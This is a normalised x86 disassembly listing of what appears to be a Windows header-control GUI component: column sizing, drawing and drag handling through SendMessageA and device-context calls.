push ebx
push esi
mov ebx eax
cmp [ ebx + 0x25 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40348c
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_40348c
mov eax [ eax + 0x18 ]
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4342fc
mov [ ebx + 0x25 ] 0x1
sub_434390
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_40405c
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418d08
sub_4343c4
push esi
mov esi eax
cmp dl [ esi + 0x1f ]
je r-xdata
pop esi
retn
mov [ esi + 0x1f ] dl
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_40348c
sub_434434
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_404414
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_40405c
xor edx edx
mov eax ebx
call sub_418ccc
sub_43445c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x18 ]
cmp edx eax
jle r-xdata
mov edx eax
cmp edx [ ebx + 0x10 ]
je r-xdata
mov edx eax
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_418cf0
mov esi eax
mov eax [ ebx + 0x4 ]
call sub_419080
dec eax
cmp esi eax
setl dl
mov eax ebx
call sub_418ccc
sub_4344b4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_418e48
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_43451c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax [ ebx + 0x18 ]
call sub_434d28
pop esi
pop ebx
retn
mov eax esi
call sub_418cf0
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_434d04
pop esi
pop ebx
retn
sub_434548
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
test edx edx
jne r-xdata
mov esi edx
test edx edx
je r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
mov esi eax
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax ebx
call sub_419080
cmp edi eax
jge r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
call sub_419080
mov edi eax
dec edi
sub_434598
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44b008
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_448008
mov edx 0x11
mov eax ebx
call sub_4482d4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x208 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov esi eax
mov [ ebx + 0x214 ] esi
mov eax esi
mov edx ebx
call sub_4476d0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x224 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_435548
mov [ ebx + 0x220 ] 0x1
mov [ ebx + 0x222 ] 0x0
mov [ ebx + 0x211 ] 0x0
mov [ ebx + 0x210 ] 0x0
xor eax eax
mov [ ebx + 0x20c ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_434668
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x214 ]
call sub_403290
mov eax [ esi + 0x208 ]
call sub_403290
mov eax [ esi + 0x224 ]
call sub_403290
mov eax [ esi + 0x20c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b12c
test bl bl
jle r-xdata
call sub_403290
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_4346c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_434154
mov edx esi
mov eax ebx
call sub_44c168
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44c094
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x221 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x80
cmp [ ebx + 0x222 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x4
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x40
sub_434738
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_418fac
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b274
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4347c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d890
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
call sub_41bf48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_4347ec
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c294
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x228 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax ebx
call sub_455bf0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434d28
push ebp
call sub_434738
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
call sub_455d2c
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
pop edx
call sub_429714
pop ebx
pop ecx
pop ebp
retn
sub_434854
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
push 0x400
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b274
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4348e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x8 ]
call sub_41e3f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4348e9
mov eax [ ebp - 0x8 ]
call sub_403290
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_41a880
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20c ] eax
sub_4348f8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44e658
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_419080
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_434504
call sub_434328
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_434504
cmp [ eax + 0x25 ] 0x0
je r-xdata
sub_434954
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419080
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4484f8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_434504
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419080
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4344b4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_434a9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419080
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419080
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_434504
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434aa5
mov eax [ ebp - 0x10 ]
call sub_403290
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_4344f8
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_434504
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419080
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_434504
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_434504
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_434aa5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419080
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_434d28
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_419080
mov edx eax
dec edx
mov eax ebx
call sub_434504
mov edx [ ebp - 0x8 ]
call sub_43445c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_434504
mov edx [ ebp - 0xc ]
call sub_43445c
sub_434b00
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x242 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x214 ]
call sub_4243a0
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_434b7c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_434c08
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov esi eax
mov edx ecx
mov eax [ esi + 0x208 ]
call sub_434504
mov ebx eax
lea eax [ esp + 0x1 ]
xor ecx ecx
mov edx 0x24
call sub_402ca4
mov [ esp + 0x1 ] 0x7
mov eax [ ebx + 0x10 ]
mov [ esp + 0x5 ] eax
mov eax [ ebx + 0xc ]
call sub_4044c8
mov [ esp + 0x9 ] eax
mov eax [ ebx + 0xc ]
call sub_4042c8
mov [ esp + 0x11 ] eax
mov al [ ebx + 0x1c ]
mov [ esp ] al
mov eax ebx
call sub_434378
test al al
je r-xdata
mov al [ esp ]
sub al 0x1
jb r-xdata
mov eax esp
call sub_4458d4
xor eax eax
mov [ esp + 0x15 ] eax
jmp r-xdata
je r-xdata
cmp [ ebx + 0x1d ] 0x1
jne r-xdata
mov [ esp + 0x15 ] 0x1
jmp r-xdata
jmp r-xdata
or [ esp + 0x15 ] 0x4000
or [ esp + 0x15 ] 0x8000
jmp r-xdata
mov [ esp + 0x15 ] 0x2
cmp [ esi + 0x228 ] 0x0
je r-xdata
or [ esp + 0x15 ] 0x4
mov eax ebx
call sub_434360
test al al
je r-xdata
lea eax [ esp + 0x1 ]
push eax
mov eax ebx
call sub_418cf0
push eax
push edi
mov eax esi
call sub_44f2dc
push eax
call SendMessageA
add esp 0x28
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
jl r-xdata
or [ esp + 0x1 ] 0x20
or [ esp + 0x15 ] 0x800
mov eax [ ebx + 0x20 ]
mov [ esp + 0x1d ] eax
sub_434d04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx 0x1204
mov eax ebx
call sub_434c08
sub_434d28
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44f5e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x210 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1200
mov eax esi
call sub_44f2dc
push eax
call SendMessageA
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi + 0x208 ]
call sub_419080
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
inc ebx
xor edi edi
push 0x0
push 0x0
push 0x1202
mov eax esi
call sub_44f2dc
push eax
call SendMessageA
dec ebx
jne r-xdata
mov ecx edi
mov edx 0x1201
mov eax esi
call sub_434c08
inc edi
dec ebx
jne r-xdata
sub_434da4
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_424450
xor eax eax
push ebp
push sub_434ea5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_424934
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_4247d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423fb4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_4240d0
mov eax [ ebp - 0x10 ]
test [ eax + 0x10 ] 0x1
setne al
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_434504
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434eac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
xor edx edx
call sub_424934
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_4247ac
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_434ebc
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov esi [ edx + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xfffffed2
jg r-xdata
sub eax 0xfffffed3
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
test [ eax ] 0x1
je r-xdata
sub eax 0x11d
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_434504
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_40348c
jmp r-xdata
sub eax 0xfffffec9
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_434504
mov ebx eax
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x0
je r-xdata
jmp r-xdata
xor eax eax
mov [ edx + 0xc ] eax
call GetMessagePos
and eax 0xffff
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x15 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ScreenToClient
mov eax [ ebp - 0x4 ]
call sub_44853c
sar eax 0x1
jns r-xdata
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov [ ebx + 0x10 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_40348c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4356ec
mov [ ebp - 0x11 ] eax
lea eax [ ebp - 0x15 ]
push eax
push 0x0
push 0x1206
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call SendMessageA
mov [ ebp - 0x39 ] 0x80
cmp [ ebp - 0x9 ] 0x0
jge r-xdata
adc eax 0x0
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_434504
mov ebx eax
mov eax [ esi + 0x8 ]
sub eax 0xfffffecd
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f2dc
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x9 ]
call sub_4296f8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x19 ]
mov [ eax + 0x21c ] edx
test [ ebp - 0xc ] 0x8
je r-xdata
mov [ ebp - 0x5 ] 0x2
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0xd ]
test ah 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x21c ] edx
jmp r-xdata
xor edx edx
push ebp
push sub_435052
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x2
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419080
dec eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21c ] eax
jmp r-xdata
test al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f2dc
lea ecx [ ebp - 0x39 ]
mov edx [ esi + 0xc ]
call sub_4296f8
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x19 ]
mov [ eax + 0x218 ] ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_434504
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_434504
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_435480
mov edx [ ebp - 0x4 ]
mov [ edx + 0x211 ] al
jmp r-xdata
mov eax [ esi + 0x14 ]
mov esi eax
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] eax
call GetMessagePos
mov edx eax
and edx 0xffff
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x238 ] edx
shr eax 0x10
mov edx [ ebp - 0x4 ]
mov [ edx + 0x23c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ScreenToClient
mov eax [ ebx + 0x18 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
mov [ esi + 0x4 ] eax
mov al [ ebp - 0x5 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x230 ] edx
sub_435184
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop ecx
pop ebp
retn
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x26
call SystemParametersInfoA
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
pop ecx
pop ebp
retn
sub_4351bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ edi ] 0x200
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44ccf0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push ebp
call sub_435184
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_448d1c
test al al
je r-xdata
movsx ebx [ edi + 0x8 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x238 ]
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x234 ]
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x230 ]
mov eax [ esi + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ esi + 0x18 ]
cmp ebx eax
jle r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
push 0x1
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40348c
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
sub [ edi + 0x8 ] bx
sub_435260
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
movsx eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ edi + 0xa ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x0
push 0x1206
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
mov edx edi
mov eax ebx
call sub_44a178
test [ esp + 0x8 ] 0x2
je r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_434504
cmp [ eax + 0x1e ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4352c0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d8c8
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_43545b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4484f8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419080
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403290
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_43543e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_4181b4
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418310
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_434504
mov esi eax
cmp [ esi + 0x1f ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418310
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_43445c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418200
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
sub_435480
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
push esp
mov edx edi
mov eax esi
mov si 0xffb1
call sub_40348c
mov al [ esp ]
pop edx
pop edi
pop esi
retn
sub_4354a0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_447fc4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x228 ]
jne r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_4354d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x228 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x228 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x224 ]
call sub_4566bc
mov eax ebx
call sub_44f2dc
xor edx edx
call sub_429714
mov edx [ ebx + 0x224 ]
call sub_456700
mov edx ebx
mov eax [ ebx + 0x228 ]
call sub_4207e4
mov eax [ ebx + 0x228 ]
call sub_455d2c
push eax
mov eax ebx
call sub_44f2dc
pop edx
call sub_429714
jmp r-xdata
mov eax ebx
call sub_434d28
pop esi
pop ebx
retn
sub_435548
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_455d2c
push eax
mov eax ebx
call sub_44f2dc
pop edx
call sub_429714
mov eax ebx
call sub_434d28
pop esi
pop ebx
retn
sub_435570
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_4355c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4356df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_4356bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419020
push eax
mov eax esi
call sub_418cf0
mov edx eax
pop eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
